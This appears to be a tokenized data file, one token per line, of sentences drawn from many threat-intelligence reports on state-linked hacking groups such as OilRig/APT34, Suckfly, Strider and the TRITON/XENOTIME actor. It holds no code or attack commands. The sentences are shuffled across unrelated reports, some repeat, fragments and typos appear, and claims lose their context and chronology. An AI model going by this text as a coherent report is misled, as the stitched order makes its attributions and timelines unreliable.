discuss
this
threat
group
whom
we
assess
to
be
working
on
behalf
of
the
Iranian
Government
,
with
a
mission
that
would
benefit
nation-state
geopolitical
and
economic
needs
.
 
On
January
8
,
2018
,
Unit
42
observed
the
OilRig
threat
group
carry
out
an
attack
on
an
insurance
agency
based
in
the
Middle
East
.
 
APT34
uses
a
mix
of
public
and
non-public
tools
,
often
conducting
spear
phishing
operations
using
compromised
accounts
from
trusted
third
parties
,
sometimes
coupled
with
social
engineering
tactics
.
 
Just
over
a
week
later
,
on
January
16
,
2018
,
we
observed
an
attack
on
a
Middle
Eastern
financial
institution
.
 
The
January
8
attack
used
a
variant
of
the
ThreeDollars
delivery
document
,
which
we
identified
as
part
of
the
OilRig
toolset
based
on
attacks
that
occurred
in
August
2017
.
 
However
,
the
attack
on
January
16
did
not
involve
ThreeDollars
at
all
.
 
Interestingly
,
the
targeted
organization
in
the
January
16
attack
had
already
been
targeted
by
the
OilRig
group
a
year
ago
on
January
2017
.
 
Instead
,
OilRig
's
attack
involved
delivering
the
OopsIE
Trojan
directly
to
the
victim
,
most
likely
using
a
link
in
a
spear
phishing
email
.
 
In
the
January
16
,
2018
attack
,
we
observed
OilRig
attacking
an
organization
it
previously
targeted
in
January
2017
.
 
On
January
8
,
2018
,
the
OilRig
threat
group
sent
an
email
with
the
subject
Beirut
Insurance
Seminar
Invitation
to
an
insurance
agency
in
the
Middle
East
.
 
The
email
contained
an
attachment
named
Seminar-Invitation.doc
,
which
is
a
malicious
Microsoft
Word
document
we
track
as
ThreeDollars
.
 
This
suggests
that
due
to
the
January
2017
attack
,
the
targeted
organization
may
have
taken
actions
to
counter
known
OilRig
TTPs
,
in
this
case
delivering
malicious
macro
documents
,
causing
the
OilRig
operators
to
adopt
a
different
delivery
tactic
.
 
We
also
identified
another
sample
of
ThreeDollars
,
created
on
January
15
,
2017
with
the
file
name
strategy
preparation.dot
.
 
The
samples
of
ThreeDollars
we
collected
in
these
attacks
are
structurally
very
similar
to
the
first
sample
we
analyzed
in
October
2017
,
down
to
the
lure
image
used
to
trick
the
recipient
into
clicking
the
"
Enable
Content
"
button
to
execute
the
malicious
macro
.
 
Since
May
2016
,
we
have
continued
to
monitor
and
uncover
various
attacks
and
tools
associated
with
the
OilRig
group
.
 
]
com
,
which
we
previously
identified
in
October
2017
to
be
an
OilRig
C2
.
 
Based
on
previously
observed
tactics
,
it
is
highly
likely
the
OilRig
group
leveraged
credential
harvesting
and
compromised
accounts
to
use
the
government
agency
as
a
launching
platform
for
their
true
attacks
.
 
Inspecting
the
class
C
network
for
185.162.235.0/24
shows
us
that
another
IP
on
the
same
network
resolves
to
an
OilRig
domain
,
msoffice-cdn.com
which
we
identified
in
August
2017
.
 
We
had
previously
observed
this
author
name
in
use
once
before
,
in
the
very
first
ThreeDollars
document
we
collected
that
we
had
reported
on
in
August
2017
.
 
The
OilRig
group
continues
to
remain
a
highly
active
adversary
in
the
Middle
East
region
.
 
Organizations
detected
a
compromise
themselves
in
62%
of
the
cases
that
Mandiant
worked
in
2017
.
 
The
group
conducts
operations
primarily
in
the
Middle
East
,
targeting
financial
,
government
,
energy
,
chemical
,
telecommunications
and
other
industries
.
 
Repeated
targeting
of
Middle
Eastern
financial
,
energy
and
government
organizations
leads
FireEye
to
assess
that
those
sectors
are
a
primary
concern
of
APT34
.
 
The
use
of
infrastructure
tied
to
Iranian
operations
,
timing
and
alignment
with
the
national
interests
of
Iran
also
lead
FireEye
to
assess
that
APT34
acts
on
behalf
of
the
Iranian
government
.
 
APT34
uses
a
mix
of
public
and
non-public
tools
and
often
uses
compromised
accounts
to
conduct
spear-phishing
operations
.
 
In
November
2017
,
APT34
leveraged
the
Microsoft
Office
vulnerability
CVE-2017-11882
to
deploy
POWRUNER
and
BONDUPDATER
less
than
a
week
after
Microsoft
issued
a
patch
.
 
Unit
42
's
ongoing
research
into
the
OilRig
campaign
shows
that
the
threat
actors
involved
in
the
original
attack
campaign
continue
to
add
new
Trojans
to
their
toolset
and
continue
their
persistent
attacks
in
the
Middle
East
.
 
When
we
first
discovered
the
OilRig
attack
campaign
in
May
2016
,
we
believed
at
the
time
it
was
a
unique
attack
campaign
likely
operated
by
a
known
,
existing
threat
group
.
 
The
email
address
is
associated
with
the
Lebanese
domain
of
a
major
global
financial
institution
.
 
POWRUNER
was
delivered
using
a
malicious
RTF
file
that
exploited
CVE-2017-0199
.
 
In
July
2017
,
we
observed
the
OilRig
group
using
a
tool
they
developed
called
ISMAgent
in
a
new
set
of
targeted
attacks
.
 
In
August
2017
,
we
found
this
threat
group
has
developed
yet
another
Trojan
that
they
call
'
Agent
Injector
'
with
the
specific
purpose
of
installing
the
ISMAgent
backdoor
.
 
On
August
23
,
2017
,
we
observed
OilRig
targeting
an
organization
within
the
United
Arab
Emirates
government
.
 
Based
on
that
research
and
this
observation
,
we
postulate
that
the
OilRig
group
gathered
credentials
to
a
legitimate
user
's
OWA
account
and
logged
into
the
user
's
account
to
send
phishing
attacks
to
other
individuals
within
the
same
,
targeted
organization
.
 
The
OilRig
group
continues
to
target
organizations
in
the
Middle
East
,
in
this
instance
targeting
the
government
of
the
United
Arab
Emirates
.
 
The
payload
embedded
within
the
ISMInjector
sample
delivered
in
this
attack
is
a
variant
of
the
ISMAgent
backdoor
that
we
had
discussed
in
detail
in
our
blog
discussing
a
targeted
attack
on
a
Saudi
Arabian
technology
company
.
 
Initial
inspection
of
this
attack
suggested
this
was
again
the
OilRig
campaign
using
their
existing
toolset
,
but
further
examination
revealed
not
only
new
variants
of
the
delivery
document
we
named
Clayslide
,
but
also
a
different
payload
embedded
inside
it
.
 
In
July
2017
,
we
observed
an
attack
on
a
Middle
Eastern
technology
organization
that
was
also
targeted
by
the
OilRig
campaign
in
August
2016
.
 
This
technique
was
observed
in
previous
Clayslide
documents
to
access
the
script
variant
of
the
Helminth
Trojan
in
earlier
OilRig
attacks
.
 
In
the
past
,
we
had
primarily
associated
the
OilRig
campaign
with
using
the
Clayslide
documents
to
deliver
as
a
payload
a
Trojan
we
named
Helminth
;
in
this
instance
,
the
payload
was
instead
a
variant
of
the
ISMDoor
Trojan
with
significant
modifications
which
we
are
now
tracking
as
ISMAgent
.
 
The
June
2017
sample
of
Clayslide
contained
the
same
OfficeServicesStatus.vbs
file
found
in
the
ISMAgent
Clayslide
document
,
but
instead
of
having
the
payload
embedded
in
the
macro
as
segregated
base64
strings
that
would
be
concatenated
,
this
variant
obtained
its
payload
from
multiple
cells
within
the
"
Incompatible
"
worksheet
.
 
Clearly
,
OilRig
incorporates
a
testing
component
within
their
development
process
,
as
we
have
previously
observed
OilRig
performing
testing
activities
on
their
delivery
documents
and
their
TwoFace
webshells
.
 
While
continuing
research
on
the
August
2018
attacks
on
a
Middle
eastern
government
that
delivered
BONDUPDATER
,
Unit
42
researchers
observed
OilRig
's
testing
activities
and
with
high
confidence
links
this
testing
to
the
creation
of
the
weaponized
delivery
document
used
in
this
attack
.
 
While
investigating
recent
attacks
performed
by
the
threat
actor
group
OilRig
using
their
new
Bondupdater
version
,
Unit
42
researchers
searched
for
additional
Microsoft
Office
documents
used
by
OilRig
hoping
to
locate
additional
malware
being
used
in
other
attacks
during
the
same
time
period
.
 
The
tester
created
the
final
test
file
less
than
8
hours
before
the
creation
time
of
a
delivery
document
,
which
was
then
delivered
via
a
spear-phishing
email
20
minutes
later
.
 
During
this
testing
,
we
saw
document
filenames
that
contain
the
C2
we
witnessed
in
the
targeted
attack
above
,
specifically
the
filenames
XLS-withyourface.xls
and
XLS-withyourface
test.xls
.
 
These
samples
appeared
to
have
been
created
by
OilRig
during
their
development
and
testing
activities
,
all
of
which
share
many
similarities
with
the
delivery
document
used
in
the
recent
OilRig
attack
against
a
Middle
Eastern
government
,
N56.15.doc
(
7cbad6b3f505a199d6766a86b41ed23786bbb99dab9cae6c18936afdc2512f00
)
that
we
have
also
included
in
Table
1
.
 
However
,
they
later
continued
by
making
modifications
to
the
Excel
document
just
prior
to
the
attack
on
August
26th
.
 
HELIX
KITTEN
is
likely
an
Iranian-based
adversary
group
,
active
since
at
least
late
2015
,
targeting
organizations
in
the
aerospace
,
energy
,
financial
,
government
,
hospitality
and
telecommunications
business
verticals
.
 
Additionally
,
HELIX
KITTEN
actors
have
shown
an
affinity
for
creating
thoroughly
researched
and
structured
spear-phishing
messages
relevant
to
the
interests
of
targeted
personnel
.
 
In
addition
to
Helminth
,
the
ISMDoor
implant
is
likely
used
by
the
Iran-based
adversary
to
attack
targets
particularly
those
in
the
Middle
East
region
.
 
These
incidents
involved
spear-phishing
attacks
,
which
characteristic
of
HELIX
KITTEN
,
included
emails
containing
malicious
PowerShell
in
their
macros
that
connects
to
known
C2
infrastructure
.
 
During
the
summer
of
2018
,
HELIX
KITTEN
actors
were
observed
targeting
entities
in
the
Middle
East
of
note
,
targets
appeared
to
be
located
in
Bahrain
and
Kuwait
.
 
ISMDoor
is
able
to
exfiltrate
data
,
take
screenshots
,
and
execute
arbitrary
commands
on
the
victim
's
machine
.
 
In
early
November
2018
,
CrowdStrike
observed
activity
from
the
HELIX
KITTEN
adversary
at
a
customer
in
the
telecommunications
vertical
.
 
The
attackers
sent
multiple
emails
containing
macro-enabled
XLS
files
to
employees
working
in
the
banking
sector
in
the
Middle
East
.
 
In
the
first
week
of
May
2016
,
FireEye
's
DTI
identified
a
wave
of
emails
containing
malicious
attachments
being
sent
to
multiple
banks
in
the
Middle
East
region
.
 
Our
data
suggests
that
actors
have
deployed
the
RGDoor
backdoor
on
webservers
belonging
to
eight
Middle
Eastern
government
organizations
,
as
well
as
one
financial
and
one
educational
institution
.
 
In
August
2018
,
Unit
42
observed
OilRig
targeting
a
government
organization
using
spear-phishing
emails
to
deliver
an
updated
version
of
a
Trojan
known
as
BONDUPDATER
.
 
The
OilRig
group
has
been
active
since
at
least
mid-2016
,
and
continues
their
attack
campaigns
throughout
the
Middle
East
,
targeting
both
governmental
agencies
and
businesses
on
an
almost
routine
basis
.
 
BONDUPDATER
is
a
PowerShell-based
Trojan
first
discovered
by
FireEye
in
mid-November
2017
,
when
OilRig
targeted
a
different
Middle
Eastern
governmental
organization
.
 
During
the
past
month
,
Unit
42
observed
several
attacks
against
a
Middle
Eastern
government
leveraging
an
updated
version
of
the
BONDUPDATER
malware
,
which
now
includes
the
ability
to
use
TXT
records
within
its
DNS
tunneling
protocol
for
its
C2
communications
.
 
The
email
had
no
subject
and
what
initially
drew
our
attention
to
OilRig
's
attack
was
the
content
of
the
spear
phishing
email
.
 
As
expected
,
OilRig
is
continuing
their
onslaught
of
attacks
well
into
2018
with
continued
targeting
in
the
Middle
East
.
 
First
identified
in
January
2015
,
Orangeworm
has
also
conducted
targeted
attacks
against
organizations
in
related
industries
as
part
of
a
larger
supply-chain
attack
in
order
to
reach
their
intended
victims
.
 
According
to
Symantec
telemetry
,
almost
40
percent
of
Orangeworm
's
confirmed
victim
organizations
operate
within
the
healthcare
industry
.
 
Their
next
move
was
to
list
any
remote
shared
drives
and
then
attempt
to
access
remote
shares
owned
by
the
specific
government
office
they
were
targeting
,
again
attempting
to
extract
all
Word
documents
.
 
Sowbug
's
next
move
was
to
list
any
remote
shared
drives
and
then
attempt
to
access
remote
shares
owned
by
the
specific
government
office
they
were
targeting
,
again
attempting
to
extract
all
Word
documents
.
 
For
example
,
in
September
2016
,
Sowbug
infiltrated
an
organization
in
Asia
,
deploying
the
Felismus
backdoor
on
one
of
its
computers
,
Computer
A
,
using
the
file
name
adobecms.exe
in
CSIDL_WINDOWS\debug
.
 
In
this
case
,
the
attackers
maintained
a
presence
on
the
target
's
network
for
nearly
six
months
between
September
2016
and
March
2017
.
 
In
other
attacks
,
there
was
evidence
that
Felismus
was
installed
using
a
tool
known
as
Starloader
(
detected
by
Symantec
as
Trojan.Starloader
)
.
 
Symantec
has
found
evidence
of
Starloader
files
being
named
AdobeUpdate.exe
,
AcrobatUpdate.exe
,
and
INTELUPDATE.EXE
among
others
.
 
Additionally
,
Starloader
was
also
observed
deploying
additional
tools
used
by
the
attackers
,
such
as
credential
dumpers
and
keyloggers
.
 
ASERT
has
learned
of
an
APT
campaign
,
possibly
originating
from
DPRK
,
we
are
calling
STOLEN
PENCIL
that
is
targeting
academic
institutions
since
at
least
May
2018
.
 
Once
gaining
a
foothold
on
a
user
's
system
,
the
threat
actors
behind
STOLEN
PENCIL
use
Microsoft
's
Remote
Desktop
Protocol
(
RDP
)
for
remote
point-and-click
access
.
 
The
group
uses
an
advanced
piece
of
malware
known
as
Remsec
(
Backdoor.Remsec
)
to
conduct
its
attacks
.
 
Strider
has
been
active
since
at
least
October
2011
.
 
Lua
modules
is
a
technique
that
has
previously
been
used
by
Flamer
.
 
The
Remsec
malware
used
by
Strider
has
a
modular
design
.
 
The
group
has
maintained
a
low
profile
until
now
and
its
targets
have
been
mainly
organizations
and
individuals
that
would
be
of
interest
to
a
nation
state
's
intelligence
services
.
 
The
group
's
targets
include
a
number
of
organizations
and
individuals
located
in
Russia
.
 
Remsec
uses
a
Lua
interpreter
to
run
Lua
modules
which
perform
various
functions
.
 
Russia
.
 
The
attackers
then
began
to
perform
reconnaissance
activities
on
Computer
A
via
cmd.exe
,
collecting
system-related
information
,
such
as
the
OS
version
,
hardware
configuration
,
and
network
information
.
 
the
group
's
targets
include
an
organization
in
Sweden
.
 
the
group
's
targets
include
an
embassy
in
Belgium
.
 
Symantec
will
continue
to
search
for
more
Remsec
modules
and
targets
in
order
to
build
upon
our
understanding
of
Strider
and
better
protect
our
customers
.
 
Another
such
an
exceptional
espionage
platform
is
"
ProjectSauron
,
also
known
as
"
Strider
"
.
 
In
September
2015
,
our
anti-targeted
attack
technologies
caught
a
previously
unknown
attack
.
 
Forensic
analysis
indicates
that
the
APT
has
been
operational
since
at
least
June
2011
and
was
still
active
in
2016
.
 
After
getting
the
IP
,
the
ProjectSauron
component
tries
to
communicate
with
the
remote
server
using
its
own
(
ProjectSauron
)
protocol
as
if
it
was
yet
another
C&C
server
.
 
In
a
number
of
the
cases
we
analyzed
,
ProjectSauron
deployed
malicious
modules
inside
the
custom
network
encryption
's
software
directory
,
disguised
under
similar
filenames
and
accessing
the
data
placed
beside
its
own
executable
.
 
The
threat
actor
behind
ProjectSauron
commands
a
top-of-the-top
modular
cyber-espionage
platform
in
terms
of
technical
sophistication
,
designed
to
enable
long-term
campaigns
through
stealthy
survival
mechanisms
coupled
with
multiple
Exfiltration
methods
.
 
In
September
2015
,
Kaspersky
Lab
's
Anti-Targeted
Attack
Platform
discovered
anomalous
network
traffic
in
a
government
organization
network
.
 
In
late
2015
,
Symantec
identified
suspicious
activity
involving
a
hacking
tool
used
in
a
malicious
manner
against
one
of
our
customers
.
 
Secondary
ProjectSauron
modules
are
designed
to
perform
specific
functions
like
stealing
documents
,
recording
keystrokes
,
and
hijacking
encryption
keys
from
both
infected
computers
and
attached
USB
sticks
.
 
activity
originated
from
three
separate
IP
addresses
,
all
located
in
Chengdu
,
China
.
 
We
don't
know
the
exact
date
Suckfly
stole
the
certificates
from
the
South
Korean
organizations
.
 
stolen
certificates
being
used
maliciously
occurred
in
early
2014
.
 
Symantec
detects
this
threat
as
Backdoor.Nidiran
.
 
Specifically
,
Suckfly
used
a
specially
crafted
web
page
to
deliver
an
exploit
for
the
Microsoft
Windows
OLE
Remote
Code
Execution
Vulnerability
(
CVE-2014-6332
)
,
which
affects
specific
versions
of
Microsoft
Windows
.
 
The
threat
then
executes
"
svchost.exe
"
.
 
Attackers
have
been
known
to
distribute
malicious
files
masquerading
as
the
legitimate
iviewers.dll
file
and
then
use
DLL
load
hijacking
to
execute
the
malicious
code
and
infect
the
computer
.
 
Once
exploit
has
been
achieved
,
Nidiran
is
delivered
through
a
self-extracting
executable
that
extracts
the
components
to
a
.tmp
folder
after
it
has
been
executed
.
 
The
certificates
Blackfly
stole
were
also
from
South
Korean
companies
,
primarily
in
the
video
game
and
software
development
industry
.
 
Blackfly
began
with
a
campaign
to
steal
certificates
,
which
were
later
used
to
sign
malware
used
in
targeted
attacks
.
 
In
March
2016
,
Symantec
published
a
blog
on
Suckfly
,
an
advanced
cyberespionage
group
that
conducted
attacks
against
a
number
of
South
Korean
organizations
to
steal
digital
certificates
.
 
Since
then
we
have
identified
a
number
of
attacks
over
a
two-year
period
,
beginning
in
April
2014
,
which
we
attribute
to
Suckfly
.
 
The
attacks
targeted
high-profile
targets
,
including
government
and
commercial
organizations
.
 
these
attacks
were
part
of
a
planned
operation
against
specific
targets
in
India
.
 
While
there
have
been
several
Suckfly
campaigns
that
infected
organizations
with
the
group
's
custom
malware
Backdoor.Nidiran
,
the
Indian
targets
show
a
greater
amount
of
post-infection
activity
than
targets
in
other
regions
.
 
While
there
have
been
several
Suckfly
campaigns
that
infected
organizations
with
the
group
's
custom
malware
Backdoor.Nidiran
,
the
Indian
targets
show
a
greater
amount
of
post-infection
activity
than
targets
in
other
regions
.
 
The
first
known
Suckfly
campaign
began
in
April
of
2014
.
 
Suckfly
's
attacks
on
government
organizations
that
provide
information
technology
services
to
other
government
branches
is
not
limited
to
India
.
 
It
has
conducted
attacks
on
similar
organizations
in
Saudi
Arabia
,
likely
because
of
the
access
that
those
organizations
have
.
 
Similar
to
its
other
attacks
,
Suckfly
used
the
Nidiran
back
door
along
with
a
number
of
hacktools
to
infect
the
victim
's
internal
hosts
.
 
In
2015
,
Suckfly
conducted
a
multistage
attack
.
 
Suckfly
conducted
a
multistage
attack
between
April
22
and
May
4
.
 
On
April
22
,
2015
,
Suckfly
exploited
a
vulnerability
on
the
targeted
employee
's
operating
system
(
Windows
)
that
allowed
the
attackers
to
bypass
the
User
Account
Control
and
install
the
Nidiran
back
door
to
provide
access
for
their
attack
.
 
Suckfly
conducted
a
multistage
attack
against
an
e-commerce
organization
.
 
Suckfly
conducted
a
multistage
attack
against
an
e-commerce
organization
based
in
India
.
 
Most
of
the
group
's
attacks
are
focused
on
government
or
technology
related
companies
and
organizations
.
 
While
we
know
the
attackers
used
a
custom
dropper
to
install
the
back
door
,
we
do
not
know
the
delivery
vector
.
 
While
tracking
what
days
of
the
week
Suckfly
used
its
hacktools
,
we
discovered
that
the
group
was
only
active
Monday
through
Friday
.
 
By
targeting
all
of
these
organizations
together
,
Suckfly
could
have
had
a
much
larger
impact
on
India
and
its
economy
.
 
While
we
don't
know
the
motivations
behind
the
attacks
,
the
targeted
commercial
organizations
,
along
with
the
targeted
government
organizations
,
may
point
in
this
direction
.
 
There
is
no
evidence
that
Suckfly
gained
any
benefits
from
attacking
the
government
organizations
,
but
someone
else
may
have
benefited
from
these
attacks
.
 
During
this
time
they
were
able
to
steal
digital
certificates
from
South
Korean
companies
and
launch
attacks
against
Indian
and
Saudi
Arabian
government
organizations
.
 
We
believe
that
Suckfly
will
continue
to
target
organizations
in
India
and
similar
organizations
in
other
countries
in
order
to
provide
economic
insight
to
the
organization
behind
Suckfly
's
operations
.
 
This
time
,
however
,
TA459
opportunistically
used
spear-phishing
emails
with
a
Microsoft
Word
attachment
exploiting
the
recently
patched
CVE-2017-0199
to
deploy
the
ZeroT
Trojan
,
which
in
turn
downloaded
the
PlugX
Remote
Access
Trojan
(
RAT
)
.
 
Proofpoint
is
tracking
this
attacker
,
believed
to
operate
out
of
China
,
as
TA459
.
 
This
time
,
however
,
attackers
opportunistically
used
spear-phishing
emails
with
a
Microsoft
Word
attachment
exploiting
the
recently
patched
CVE-2017-0199
to
deploy
the
ZeroT
Trojan
,
which
in
turn
downloaded
the
PlugX
Remote
Access
Trojan
(
RAT
)
.
 
TA549
possesses
a
diverse
malware
arsenal
including
PlugX
,
NetTraveler
,
and
ZeroT
.
 
TA459
is
well-known
for
targeting
organizations
in
Russia
and
neighboring
countries
.
 
Ongoing
activity
from
attack
groups
like
TA459
who
consistently
target
individuals
specializing
in
particular
LOCs
of
research
and
expertise
further
complicate
an
already
difficult
security
situation
for
organizations
dealing
with
more
traditional
malware
threats
,
phishing
campaigns
,
and
socially
engineered
threats
every
day
.
 
Using
data
collected
from
the
Trend
Micro
Smart
Protection
Network
,
we
are
able
to
identify
victims
whose
networks
communicated
with
Taidoor
C&C
servers
.
 
The
Taidoor
attackers
have
been
actively
engaging
in
targeted
attacks
since
at
least
March
4
,
2009
.
 
Taidoor
spoofed
Taiwanese
government
email
addresses
to
send
out
socially
engineered
emails
in
the
Chinese
language
that
typically
leveraged
Taiwan-themed
issues
.
 
Despite
some
exceptions
,
the
Taidoor
campaign
often
used
Taiwanese
IP
addresses
as
C&C
servers
and
email
addresses
to
send
out
socially
engineered
emails
with
malware
as
attachments
.
 
One
of
the
primary
targets
of
the
Taidoor
campaign
appeared
to
be
the
Taiwanese
government
.
 
Suckfly
targeted
one
of
India
's
largest
e-commerce
companies
,
a
major
Indian
shipping
company
,
one
of
India
's
largest
financial
organizations
,
and
an
IT
firm
that
provides
support
for
India
's
largest
stock
exchange
.
 
Data
from
the
early
part
of
this
year
shows
that
the
Taidoor
attackers
rampantly
used
malicious.DOC
files
to
exploit
a
Microsoft
Common
Controls
vulnerability
,
CVE-2012-0158
.
 
Taidoor
actively
sent
out
malicious
documents
and
maintained
several
IP
addresses
for
command
and
control
.
 
The
attackers
actively
sent
out
malicious
documents
and
maintained
several
IP
addresses
for
command
and
control
.
 
As
part
of
their
social
engineering
ploy
,
the
Taidoor
attackers
attach
a
decoy
document
to
their
emails
that
,
when
opened
,
displays
the
contents
of
a
legitimate
document
but
executes
a
malicious
payload
in
the
background
.
 
Sometimes
,
however
,
certain
samples
made
use
of
domain
names
for
HTTP
communication
.
 
Based
on
the
command
capabilities
of
the
Taidoor
malware
,
we
were
able
to
determine
that
data
theft
and
data
destruction
was
possible
.
 
The
ultimate
objective
of
targeted
attacks
is
to
acquire
sensitive
data
.
 
In
December
2017
,
FireEye
publicly
released
our
first
analysis
on
the
TRITON
attack
where
malicious
actors
used
the
TRITON
custom
attack
framework
to
manipulate
industrial
safety
systems
at
a
critical
infrastructure
facility
and
inadvertently
caused
a
process
shutdown
.
 
In
our
most
recent
analysis
,
we
attributed
the
intrusion
activity
that
led
to
the
deployment
of
TRITON
to
a
Russian
government-owned
technical
research
institute
in
Moscow
.
 
For
more
in-depth
analysis
of
TRITON
and
other
cyber
threats
,
consider
subscribing
to
FireEye
Cyber
Threat
Intelligence
.
 
During
this
time
,
the
attacker
must
ensure
continued
access
to
the
target
environment
or
risk
losing
years
of
effort
and
potentially
expensive
custom
ICS
malware
.
 
In
this
report
we
continue
our
research
of
the
actor
's
operations
with
a
specific
focus
on
a
selection
of
custom
information
technology
(
IT
)
tools
and
tactics
the
threat
actor
leveraged
during
the
early
stages
of
the
targeted
attack
lifecycle
.
 
Additionally
,
the
actor
possibly
gained
a
foothold
on
other
target
networksbeyond
the
two
intrusions
discussed
in
this
post
using
similar
strategies
.
 
There
is
often
a
singular
focus
from
the
security
community
on
ICS
malware
largely
due
to
its
novel
nature
and
the
fact
that
there
are
very
few
examples
found
in
the
wild
.
 
In
this
blog
post
we
provide
additional
information
linking
TEMP.Veles
and
their
activity
surrounding
the
TRITON
intrusion
to
a
Russian
government-owned
research
institute
.
 
Analysis
of
these
cryptcat
binaries
indicates
that
the
actor
continually
modified
them
to
decrease
AV
detection
rates
.
 
TEMP.Veles'
lateral
movement
activities
used
a
publicly-available
PowerShell-based
tool
,
WMImplant
.
 
On
multiple
dates
in
2017
,
TEMP.Veles
struggled
to
execute
this
utility
on
multiple
victim
systems
,
potentially
due
to
AV
detection
.
 
Custom
payloads
utilized
by
TEMP.Veles
in
investigations
conducted
by
Mandiant
are
typically
weaponized
versions
of
legitimate
open-source
software
,
retrofitted
with
code
used
for
command
and
control
.
 
We
identified
file
creation
times
for
numerous
files
that
TEMP.Veles
created
during
lateral
movement
on
a
target
's
network
.
 
Adversary
behavioral
artifacts
further
suggest
the
TEMP.Veles
operators
are
based
in
Moscow
,
lending
some
further
support
to
the
scenario
that
CNIIHM
,
a
Russian
research
organization
in
Moscow
,
has
been
involved
in
TEMP.Veles
activity
.
 
XENOTIME
is
easily
the
most
dangerous
threat
activity
publicly
known
.
 
CNIIHM
's
characteristics
are
consistent
with
what
we
might
expect
of
an
organization
responsible
for
TEMP.Veles
activity
.
 
Dragos
identified
several
compromises
of
ICS
vendors
and
manufacturers
in
2018
by
activity
associated
with
XENOTIME
,
providing
potential
supply
chain
threat
opportunities
and
vendor-enabled
access
to
asset
owner
and
operator
ICS
networks
.
 
XENOTIME
rose
to
prominence
in
December
2017
when
Dragos
and
FireEye
jointly
published
details
of
TRISIS
destructive
malware
targeting
Schneider
Electric
's
Triconex
safety
instrumented
system
.
 
Targeting
a
safety
system
indicates
significant
damage
and
loss
of
human
life
were
either
intentional
or
acceptable
goals
of
the
attack
,
a
consequence
not
seen
in
previous
disruptive
attacks
such
as
the
2016
CRASHOVERRIDE
malware
that
caused
a
power
loss
in
Ukraine
.
 
XENOTIME
used
credential
capture
and
replay
to
move
between
networks
,
Windows
commands
,
standard
command-line
tools
such
as
PSExec
,
and
proprietary
tools
for
operations
on
victim
hosts
.
 
Dragos'
data
indicates
XENOTIME
remains
active
.
 
TEMP.Veles
created
a
custom
malware
framework
and
tailormade
credential
gathering
tools
,
but
an
apparent
misconfiguration
prevented
the
attack
from
executing
properly
.
 
Furthermore
,
Dragos'
analysis
of
the
TRISIS
event
continues
as
we
recover
additional
data
surrounding
the
incident
.
 
XENOTIME
operates
globally
,
impacting
regions
far
outside
of
the
Middle
East
,
their
initial
target
.
 
Intelligence
suggests
the
group
has
been
active
since
at
least
2014
and
is
presently
operating
in
multiple
facilities
targeting
safety
systems
beyond
Triconex
.
 
Dragos
instead
focuses
on
threat
behaviors
and
appropriate
detection
and
response
.
 
Dragos
assesses
with
moderate
confidence
that
XENOTIME
intends
to
establish
required
access
and
capability
to
cause
a
potential
,
future
disruptiveor
even
destructiveevent
.
 
However
,
full
details
on
XENOTIME
and
other
group
tools
,
techniques
,
procedures
,
and
infrastructure
is
available
to
network
defenders
via
Dragos
WorldView
.
 
This
seems
confusing
as
FireEye
earlier
publicly
declared
the
TRITON
as
a
discrete
entity
,
linked
to
a
Russian
research
institution
,
and
christened
it
as
"
TEMP.Veles
"
.
 
This
seems
confusing
as
FireEye
earlier
publicly
declared
the
"
TRITON
actor
"
as
a
discrete
entity
,
linked
to
a
Russian
research
institution
,
and
christened
it
as
"
TEMP.Veles
"
.
 
Meanwhile
,
parallel
work
at
Dragos
(
my
employer
,
where
I
have
performed
significant
work
on
the
activity
described
above
)
uncovered
similar
conclusions
concerning
TTPs
and
behaviors
,
for
both
the
2017
event
and
subsequent
activity
in
other
industrial
sectors
.
 
FireEye
recently
published
a
blog
covering
the
tactics
,
techniques
,
and
procedures
(
TTPs
)
for
the
"
TRITON
actor
"
when
preparing
to
deploy
the
TRITON/TRISIS
malware
framework
in
2017
.
 
Based
on
information
gained
from
discussion
with
the
initial
TRITON/TRISIS
responders
and
subsequent
work
on
follow-on
activity
by
this
entity
,
Dragos
developed
a
comprehensive
(
public
)
picture
of
adversary
activity
roughly
matching
FireEye
's
analysis
published
in
April
2019
,
described
in
various
media
.
 
Since
late
2018
,
based
upon
the
most-recent
posting
,
FireEye
appears
to
have
"
walked
back
"
the
previously-used
terminology
of
TEMP.Veles
and
instead
refers
rather
cryptically
to
the
"
TRITON
actor
"
,
while
Dragos
leveraged
identified
behaviors
to
consistently
refer
to
an
activity
group
,
XENOTIME
.
 
Dragos
leveraged
identified
behaviors
to
consistently
refer
to
an
activity
group
,
XENOTIME
.
 
Aside
from
the
competitive
vendor
naming
landscape
(
which
I
am
not
a
fan
of
in
cases
on
direct
overlap
,
but
which
has
more
to
say
for
itself
when
different
methodologies
are
employed
around
similar
observations
)
,
the
distinction
between
FireEye
and
Dragos'
approaches
with
respect
to
the
"
TRITON
actor
"
comes
down
to
fundamental
philosophical
differences
in
methodology
.
 
In
the
2018
public
posting
announcing
TEMP.Veles
,
FireEye
researchers
noted
that
the
institute
in
question
at
least
supported
TEMP.Veles
activity
in
deploying
TRITON
.
 
My
understanding
is
FireEye
labels
entities
where
definitive
attribution
is
not
yet
possible
with
the
"
TEMP
"
moniker
(
hence
,
TEMP.Veles
)
yet
in
this
case
FireEye
developed
and
deployed
the
label
,
then
appeared
to
move
aACT
from
it
in
subsequent
reporting
.
 
In
comparison
,
XENOTIME
was
defined
based
on
principles
of
infrastructure
(
compromised
third-party
infrastructure
and
various
networks
associated
with
several
Russian
research
institutions
)
,
capabilities
(
publicly-
and
commercially-available
tools
with
varying
levels
of
customization
)
and
targeting
(
an
issue
not
meant
for
discussion
in
this
blog
)
.
 
Of
note
,
this
methodology
of
naming
abstracts
aACT
the
"
who
"
element
XENOTIME
may
represent
a
single
discrete
entity
(
such
as
a
Russian
research
institution
)
or
several
entities
working
in
coordination
in
a
roughly
repeatable
,
similar
manner
across
multiple
events
.
 
Much
like
the
observers
watching
the
shadows
of
objects
cast
upon
the
wall
of
the
cave
,
these
two
definitions
(
XENOTIME
and
TEMP.Veles
,
both
presumably
referring
to
"
the
TRITON
actor
"
)
describe
the
same
phenomena
,
yet
at
the
same
time
appear
different
.
 
To
better
understand
how
the
adversary
was
operating
and
what
other
actions
they
had
performed
,
CTU
researchers
examined
cmd.exe
and
its
supporting
processes
to
uncover
additional
command
line
artifacts
.
 
CTU
researchers
assess
with
high
confidence
that
threat
groups
like
Threat
Group-1314
will
continue
to
live
off
of
the
land
to
avoid
detection
and
conduct
their
operations
.
 
Analysis
of
TG-3390
's
operations
,
targeting
,
and
tools
led
CTU
researchers
to
assess
with
moderate
confidence
the
group
is
located
in
the
People's
Republic
of
China
.
 
The
threat
actors
target
a
wide
range
of
organizations
:
CTU
researchers
have
observed
TG-3390
actors
obtaining
confidential
data
on
